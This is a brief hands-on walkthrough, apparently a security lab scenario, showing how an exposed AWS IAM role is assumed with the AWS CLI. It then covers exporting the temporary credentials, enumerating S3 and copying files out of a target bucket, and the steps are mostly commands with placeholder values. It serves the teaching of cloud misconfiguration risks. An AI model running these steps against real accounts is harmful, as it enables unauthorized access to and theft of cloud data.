#  Exploiting a Public IAM Role to Access Sensitive Data

This hands-on scenario demonstrates how an attacker can assume a **public IAM role** using AWS CLI and abuse temporary credentials to access **S3 buckets**, **enumerate IAM identities**, and extract sensitive data.

>  Educational use only. Do **not** run against production or unauthorized AWS environments.

---

## Objective

- Assume a public IAM role (exposed via misconfig or EC2 SSRF)
- Export temporary credentials
- Access a sensitive S3 bucket
- Optional: Enumerate IAM and explore EC2 metadata

---

##  Requirements

- AWS CLI installed (`aws --version`)
- Exposed IAM Role ARN
- Internet access
- Linux/Mac or WSL terminal

---

##  Exploitation Steps

### 1️ Assume the Public IAM Role

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::<ACCOUNT_ID>:role/PublicExploitableRole \
  --role-session-name attacker-session
```
## Export Temporary Credentials
```bash
export AWS_ACCESS_KEY_ID="ASIA...."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```
## Confirm identity:
```bash
aws sts get-caller-identity
```
## List S3 Buckets (Recon)
```bash
aws s3 ls
```
## Access the Target S3 Bucket
```bash
aws s3 ls s3://<bucket-name>

aws s3 cp s3://<bucket-name>/<file-name> .
```





